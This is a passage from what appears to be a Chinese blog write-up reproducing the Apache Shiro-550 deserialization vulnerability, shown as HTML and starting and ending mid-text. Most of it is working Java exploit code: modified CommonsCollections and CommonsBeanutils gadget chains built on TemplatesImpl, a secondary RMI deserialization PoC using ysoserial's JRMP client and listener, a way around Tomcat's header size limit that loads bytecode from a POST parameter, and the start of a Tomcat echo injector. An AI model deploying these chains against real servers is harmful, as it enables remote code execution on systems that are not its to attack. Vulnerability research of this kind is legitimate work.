+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Base64.<span style="color:#a6e22e">encodeToString</span>(encrypted);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><h1 id="反序列化利用链">反序列化利用链<a hidden class="anchor" aria-hidden="true" href="#反序列化利用链">#</a></h1>
+<h2 id="cc链改造">CC链改造<a hidden class="anchor" aria-hidden="true" href="#cc链改造">#</a></h2>
+<p>但shiro反序列化时 ClassResolvingObjectInputStream 为 shiro 框架实现的自定义类</p>
+<p>在使用一些 Gadget 如 CC6 时会报错：<code>Unable to load clazz named [[Lorg.apache.commons.collections.Transformer;]</code></p>
+<p><strong>如果反序列化流中包含非 Java 自身的数组(非String[], byte[]等)，则会出现无法加载类的错误。</strong></p>
+<p>让<code>InvokerTransformer</code>直接调用<code>TemplatesImpl</code>的<code>newTransformer</code>方法。代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Templates templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_bytecodes&#34;</span>,<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{getEvilClass()});
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_class&#34;</span>,<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_name&#34;</span>,<span style="color:#e6db74">&#34;asd&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        InvokerTransformer invokerTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;newTransformer&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> lazymap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(map, <span style="color:#66d9ef">new</span> ConstantTransformer(1));
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> map2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazymap, templates);
+</span></span><span style="display:flex;"><span>        map2.<span style="color:#a6e22e">put</span>(tiedMapEntry, <span style="color:#e6db74">&#34;bbb&#34;</span>);
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">remove</span>(templates);
+</span></span><span style="display:flex;"><span>        setFieldValue(lazymap, <span style="color:#e6db74">&#34;factory&#34;</span>, invokerTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(ser(map2));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>commons-collections:4.0</code>依赖的CC2可以直接用，但CC4不能用</p>
+<h2 id="cb链改造">CB链改造<a hidden class="anchor" aria-hidden="true" href="#cb链改造">#</a></h2>
+<p><code>BeanComparator</code>默认使用<code>org.apache.commons.collections.comparators.ComparableComparator</code>。在没有CC依赖时会报错。</p>
+<p>CB链是要调用<code>BeanComparator#compare</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span>(Object o1, Object o2) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">comparator</span>.<span style="color:#a6e22e">compare</span>(o1, o2);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            Object value1 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o1, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
+</span></span><span style="display:flex;"><span>            Object value2 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o2, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">comparator</span>.<span style="color:#a6e22e">compare</span>(value1, value2);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IllegalAccessException var5) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;IllegalAccessException: &#34;</span> <span style="color:#f92672">+</span> var5.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (InvocationTargetException var6) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;InvocationTargetException: &#34;</span> <span style="color:#f92672">+</span> var6.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (NoSuchMethodException var7) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;NoSuchMethodException: &#34;</span> <span style="color:#f92672">+</span> var7.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后调用<code>PropertyUtils.getProperty</code>触发getter。</p>
+<p>触发点在<code>this.comparator.compare(value1, value2);</code>前面，所以将<code>ComparableComparator</code>替换，甚至设为null也不会有影响。</p>
+<p>POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> argss) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Templates templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_bytecodes&#34;</span>,<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{getEvilClass()});
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_class&#34;</span>,<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_name&#34;</span>,<span style="color:#e6db74">&#34;asd&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> BeanComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">&#34;lowestSetBit&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(2, comparator);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">&#34;1&#34;</span>));
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">&#34;1&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(comparator, <span style="color:#e6db74">&#34;comparator&#34;</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(comparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Object<span style="color:#f92672">[]</span> queueArray <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(queue, <span style="color:#e6db74">&#34;queue&#34;</span>);
+</span></span><span style="display:flex;"><span>        queueArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;
+</span></span><span style="display:flex;"><span>        queueArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(ser(queue));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="rmi反序列化">RMI反序列化<a hidden class="anchor" aria-hidden="true" href="#rmi反序列化">#</a></h2>
+<p>二次反序列化思路，既然这里的反序列化禁止了非Java 自身的数组得反序列化，那通过RMI反序列化再次触发原生反序列化即可。</p>
+<p>用<code>ysoserial.payloads.JRMPClient</code>触发RMI连接，本地用<code>ysoserial.exploits.JRMPListener</code>监听连接然后发送CC1序列化数据。</p>
+<p>POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        String host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> 1234;
+</span></span><span style="display:flex;"><span>        ObjID id <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjID(<span style="color:#66d9ef">new</span> Random().<span style="color:#a6e22e">nextInt</span>()); <span style="color:#75715e">// RMI registry</span>
+</span></span><span style="display:flex;"><span>        TCPEndpoint te <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TCPEndpoint(host, port);
+</span></span><span style="display:flex;"><span>        UnicastRef ref <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> UnicastRef(<span style="color:#66d9ef">new</span> LiveRef(id, te, <span style="color:#66d9ef">false</span>));
+</span></span><span style="display:flex;"><span>        RemoteObjectInvocationHandler obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RemoteObjectInvocationHandler(ref);
+</span></span><span style="display:flex;"><span>        Registry proxy <span style="color:#f92672">=</span> (Registry) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(JRMPClient.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getClassLoader</span>(), <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                Registry.<span style="color:#a6e22e">class</span>
+</span></span><span style="display:flex;"><span>        }, obj);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(ser(proxy));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        CommonsCollections1 commonsCollections1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> CommonsCollections1();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object expobj <span style="color:#f92672">=</span> commonsCollections1.<span style="color:#a6e22e">getObject</span>(<span style="color:#e6db74">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        JRMPListener jrmpListener <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JRMPListener(1234, expobj);
+</span></span><span style="display:flex;"><span>        jrmpListener.<span style="color:#a6e22e">run</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="绕过header长度限制">绕过Header长度限制<a hidden class="anchor" aria-hidden="true" href="#绕过header长度限制">#</a></h1>
+<h2 id="post传参">POST传参<a hidden class="anchor" aria-hidden="true" href="#post传参">#</a></h2>
+<p>Tomcat默认限制Header不能超过8192字节。</p>
+<p>在<code>org.apache.coyote.http11.AbstractHttp11Protocol</code>定义了：
+<img alt="2" loading="lazy" src="/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/2.png"></p>
+<p><code>org.apache.coyote.http11.Http11InputBuffer#fill</code>方法会检测是否超过限制。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">fill</span>(<span style="color:#66d9ef">boolean</span> block) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isTraceEnabled</span>()) {
+</span></span><span style="display:flex;"><span>        log.<span style="color:#a6e22e">trace</span>(<span style="color:#e6db74">&#34;Before fill(): parsingHeader: [&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parsingHeader</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;], parsingRequestLine: [&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parsingRequestLine</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;], parsingRequestLinePhase: [&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parsingRequestLinePhase</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;], parsingRequestLineStart: [&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parsingRequestLineStart</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;], byteBuffer.position(): [&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">byteBuffer</span>.<span style="color:#a6e22e">position</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;], byteBuffer.limit(): [&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">byteBuffer</span>.<span style="color:#a6e22e">limit</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;], end: [&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">end</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;]&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parsingHeader</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">byteBuffer</span>.<span style="color:#a6e22e">limit</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">headerBufferSize</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parsingRequestLine</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">protocol</span>().<span style="color:#a6e22e">setString</span>(<span style="color:#e6db74">&#34;HTTP/1.1&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(sm.<span style="color:#a6e22e">getString</span>(<span style="color:#e6db74">&#34;iib.requestheadertoolarge.error&#34;</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">byteBuffer</span>.<span style="color:#a6e22e">limit</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">end</span>).<span style="color:#a6e22e">position</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">end</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>尝试反序列化部分和要加载的字节码分离，反序列化TemplatesImpl执行代码，从POST参数中获取base64编码的java字节码，然后调用<code>defineClass</code>加载。用javassist直接生成的java字节码比javac编译出来的体积小很多。POST传参的数据长度不限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> argss) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Templates templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_bytecodes&#34;</span>,<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{generate()});
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_class&#34;</span>,<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_name&#34;</span>,<span style="color:#e6db74">&#34;asd&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        AttrCompare attrCompare <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AttrCompare();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> BeanComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">&#34;lowestSetBit&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(2, comparator);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">&#34;1&#34;</span>));
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">&#34;1&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(comparator, <span style="color:#e6db74">&#34;comparator&#34;</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(comparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Object<span style="color:#f92672">[]</span> queueArray <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(queue, <span style="color:#e6db74">&#34;queue&#34;</span>);
+</span></span><span style="display:flex;"><span>        queueArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;
+</span></span><span style="display:flex;"><span>        queueArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;序列化数据：&#34;</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(ser(queue));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;\n\n字节码：&#34;</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(Base64.<span style="color:#a6e22e">encodeToString</span>(getPayloadClass()));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">generate</span>() <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>            CtClass ctClass <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">makeClass</span>(<span style="color:#e6db74">&#34;Injector2&#34;</span>);
+</span></span><span style="display:flex;"><span>            CtClass superClass <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span>);
+</span></span><span style="display:flex;"><span>            ctClass.<span style="color:#a6e22e">setSuperclass</span>(superClass);
+</span></span><span style="display:flex;"><span>            CtConstructor constructor <span style="color:#f92672">=</span> ctClass.<span style="color:#a6e22e">makeClassInitializer</span>();
+</span></span><span style="display:flex;"><span>            constructor.<span style="color:#a6e22e">setBody</span>(<span style="color:#e6db74">&#34;......&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> ctClass.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>            ctClass.<span style="color:#a6e22e">defrost</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> bytes;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>{};
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>通过javassist生成类的构造函数代码，修改自<a href="https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEcho-%E5%85%A8%E7%89%88%E6%9C%AC.jsp">Tomcat Echo</a>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ThreadGroup group <span style="color:#f92672">=</span> Thread.<span style="color:#a6e22e">currentThread</span>().<span style="color:#a6e22e">getThreadGroup</span>();
+</span></span><span style="display:flex;"><span>    java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">Field</span> f <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    Thread<span style="color:#f92672">[]</span> threads <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> group.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;threads&#34;</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        threads <span style="color:#f92672">=</span> (Thread<span style="color:#f92672">[]</span>) f.<span style="color:#a6e22e">get</span>(group);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(Exception e){}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> threads.<span style="color:#a6e22e">length</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>            Thread t <span style="color:#f92672">=</span> threads<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (t <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            String str <span style="color:#f92672">=</span> t.<span style="color:#a6e22e">getName</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (str.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;exec&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>str.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;http&#34;</span>)) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            f <span style="color:#f92672">=</span> t.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;target&#34;</span>);
+</span></span><span style="display:flex;"><span>            f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            Object obj <span style="color:#f92672">=</span> f.<span style="color:#a6e22e">get</span>(t);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(obj <span style="color:#66d9ef">instanceof</span> Runnable)) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            f <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;this$0&#34;</span>);
+</span></span><span style="display:flex;"><span>            f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);obj <span style="color:#f92672">=</span> f.<span style="color:#a6e22e">get</span>(obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>{
